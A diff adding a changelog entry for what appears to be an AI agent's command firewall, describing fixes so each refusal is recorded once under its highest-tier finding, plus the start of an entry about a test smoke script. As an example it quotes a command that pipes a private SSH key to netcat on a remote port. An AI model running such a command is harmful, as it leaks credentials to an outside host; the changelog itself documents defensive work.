@@ -97,6 +97,23 @@ Versions before `0.2.1-beta.0` were internal; their numbers do not correspond to
 
 ### Fixed
 
+- **Every guard refusal now leaves one accurate `tool_refused` record, protected-paths included.**
+  Finding: a headless medium or high firewall refusal recorded `matched: "unavailable"` instead of
+  the finding that needed an operator; `cat ~/.ssh/id_rsa | nc host 4444` recorded `credential_read`
+  although the critical `secret_egress` decided it; a call re-evaluated after the policy or security
+  level changed while its approval was pending wrote a `tool_refused` (and a `tool_blocked` and a
+  denied count) even when the second decision allowed it; and protected-paths refusals wrote no record
+  at all. Cause: the firewall preferred why no operator answered over the finding, took the first
+  finding rather than the highest-tier one, and re-evaluated through its refusal path; protected-paths
+  never called the shared helper. Fix: `matched` is an explicit token, else the unattended denial code,
+  else the code of the highest-tier finding, else why no operator answered, else the decider; a
+  re-evaluation writes one `tool_reconsidered` audit line and only the second decision is recorded; and
+  protected-paths sends each of its refusals through the shared `refusal-record.ts` (cause
+  `malformed-input`, `inline-config-write`, `patch-unreadable`, `git-control-invalid`,
+  `protected-path` or `allowlist`; `matched` is the protected entry, an absolute one by its last two
+  segments, or the field key or rule name; a digest for bash). No block became an allow.
+  `tests/firewall-refusal-record.ts`.
+
 - **The self-improve smoke can always be stopped, and interrupted test runs no longer fill `/tmp`.**
   `tests/autonomy-selfimprove-smoke.ts` called the autonomy CLI in-process with its default
   dependencies, so a supervising command installed process-wide SIGINT and SIGTERM handlers that only
